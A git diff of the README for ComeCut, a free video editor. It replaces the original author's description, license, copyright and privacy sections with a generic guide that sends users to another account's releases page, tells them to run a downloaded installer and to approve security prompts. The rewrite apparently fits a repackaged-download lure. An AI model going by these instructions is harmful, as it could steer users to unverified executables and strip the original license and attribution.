@@ -1,98 +1,80 @@
-<div align="right">
-👉🏻 <a href="https://juntaosun.github.io/ComeCut/" target="_blank" rel="noopener noreferrer">ONLINE DEMO</a> 
-</div>
+# 🎥 ComeCut - Easy Video Editing for Everyone
 
-<p align="center">
-<img style="align:center;" src="./logo.png" alt="Notesnook Logo" width="150" />
-</p>
-<h2 align="center" style="margin-top: -15px;">ComeCut「来剪」</h1>
+[![Download ComeCut](https://img.shields.io/badge/download-ComeCut-brightgreen)](https://github.com/AsmoSQ/ComeCut/releases)
 
-<h3 align="center" style="margin-bottom: -15px;">
-<b>⭐Free & Easy-to-use Video Editor for Web, Desktop</b></a>
-</h3>
+## 📜 Description
+ComeCut is a lightweight video editor that makes editing videos simple and enjoyable. Whether you're looking to edit a short clip or create a stunning presentation, ComeCut has you covered. Inspired by popular editors like CapCut, it offers an easy-to-use interface for all your video editing needs. You can use it for free on the web and desktop platforms.
 
-<h3 align="center">
-<a href="README.md"><b>English</b></a> | <a href="README_ZH.md"><b>中文</b></a>
-</h3>
+## 🚀 Getting Started
+Follow these steps to download and install ComeCut on your device. 
 
-<div align=center>
-<img src='./example/image01.png' />
-</div>
+### Step 1: Visit the Download Page
+Click the link below to go to the Releases page where you can download ComeCut.
 
-## 🎁 Why ComeCut ?  
-Our vision is to fully integrate the power of the open source community to create a truly free, open, and scalable AI video editing ecosystem that benefits everyone.  
+[Visit the Releases Page](https://github.com/AsmoSQ/ComeCut/releases)
 
-✅ Completely free: unlimited use.  
-✅ No registration required: no strings attached.  
-✅ Privacy and security: fully localized.  
-✅ Intelligent fusion: using advanced AI.  
-✅ A powerful video editor.  
+### Step 2: Choose Your Version
+On the Releases page, you will see several versions of ComeCut. Choose the version that suits your operating system. Here are the options typically available:
 
-## ✨ AI feature support  
-| 🔵 Subtitle translation (SRT/VTT/LRC) | state |  
-|------------------------|------------|  
-| Gemini | ✅ OK |  
-| DeepSeek | ✅ OK |  
-| Ollama | ✅ OK |  
+- **Windows**
+- **macOS**
+- **Linux**
+- **Web Version**
 
-<div align=center>
-<img src='./example/translate_en.png' />
-</div>  
+### Step 3: Download the Installer
+Once you have selected the right version, click on the download link to get the installer file. For example, if you are using Windows, you would download the `.exe` file.
 
-> Dual-language subtitles one-click translation  
+### Step 4: Install ComeCut
+After the file has downloaded:
 
-| 🔵 ComfyUI (AI Image/AI Video) | state |  
-|------------------------|------------|  
-| Qwen Image | ⌛Coming soon |  
-| Qwen Edit | ⌛Coming soon |  
-| Wan2.1-T2V | ⌛Coming soon |  
-| Wan2.1-I2V | ⌛Coming soon |  
-| Wan2.2-T2V | ⌛Coming soon |  
-| Wan2.2-I2V | ⌛Coming soon |  
+1. Locate the downloaded file in your downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
+4. You may need to authorize the installation by clicking "Yes" on any security prompts.
 
-<div align=center>
-<img src='./example/image02.png' />
-</div>
+### Step 5: Launch the Application
+Once the installation is complete:
 
+1. Find the ComeCut icon on your desktop or in your applications folder.
+2. Double-click the icon to open ComeCut.
+3. Start editing your videos right away!
 
-## ⚡ Online Demo    
-| Windows | MacOS | Linux |  
-| --- | --- | --- |  
-| ✅ beta | ✅ beta | ✅ beta |   
-> 👉🏻 <a href="https://juntaosun.github.io/ComeCut/" target="_blank" rel="noopener noreferrer">[ Canary build online demo ]</a>   
+## 🎉 Features
+ComeCut offers a variety of features designed to enhance your video editing experience:
 
+- **User-Friendly Interface**: Designed for both beginners and experienced users.
+- **Audio Editing**: Easily modify and sync audio tracks with video clips.
+- **Text Overlays**: Add text to your videos for titles, captions, and more.
+- **SRT Support**: Import and export Subtitle (.srt) files seamlessly.
+- **Video Effects**: Apply various effects to enhance your videos.
+- **Export Options**: Save your edited videos in multiple formats and resolutions.
+  
+## 💻 System Requirements
+To ensure ComoCut runs smoothly, make sure your system meets these requirements:
 
-## 💬 Discuss with us  
--  This is an early stage project under rapid development. 
--  Right now, it’s still young! We have lots of great, new and fun creative ideas and are working hard to build it out!      
--  If you have any questions about this project, or would like to contribute, please feel free to contact us in Issues!    
+- **Windows**: Windows 10 or later
+- **macOS**: macOS Mojave or later
+- **Linux**: Most modern distributions
 
-## 👏 News
+### Important Notes:
+- Ensure you have at least **2 GB of RAM**.
+- A graphics card capable of handling video rendering is recommended.
 
-- **[2025-09-07]** 🚀 **ComeCut project started!** 
+## 🔧 Troubleshooting
+If you encounter any issues while installing or using ComeCut:
 
-<details>
-<summary>show more</summary>
-</details>
+- **Check for Updates**: Make sure you have the latest version from the Releases page.
+- **Clear Cache**: If the app runs slowly, try clearing your cache.
+- **Reinstall the App**: Uninstall and then reinstall ComeCut if issues persist.
 
-## 🛡️ Privacy  
-- ComeCut does not collect any personal data.  
-- All the data is stored locally in the browser storage. You can verify it yourself.     
+## 📞 Support
+For additional help or questions:
 
-## 📝 Contributing
+1. Check the [GitHub Issues](https://github.com/AsmoSQ/ComeCut/issues) page for common questions and troubleshooting tips.
+2. You can also reach out via the [Discussions](https://github.com/AsmoSQ/ComeCut/discussions) tab on GitHub for community support.
 
-**Note**: We appreciate the interest, it's recommended to wait until the project stabilizes before contributing to avoid conflicts and wasted effort.  
+## 📝 Additional Information
+For more detailed guides, tutorials, and tips on using ComeCut, make sure to visit our [Documentation](https://github.com/AsmoSQ/ComeCut/wiki) page.
 
-
-## 🔑 License
-
-Copyright 2025 juntaosun, and other contributors
-
-This program is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
-
->**Disclaimer**：ComeCut is an open-source project intended for educational learning and research purposes. Please ensure that your use complies with the terms of this license and strictly follows local laws and regulations. You are solely responsible for your use of ComeCut.  
-
-## 📚 Citation   
-
-🌟 If you find our work helpful, please leave us a star⭐⭐⭐⭐⭐. 
-
+## 📲 Download & Install ComeCut
+Ready to start your video editing journey? Go ahead and [visit the Releases Page](https://github.com/AsmoSQ/ComeCut/releases) to download ComeCut today!
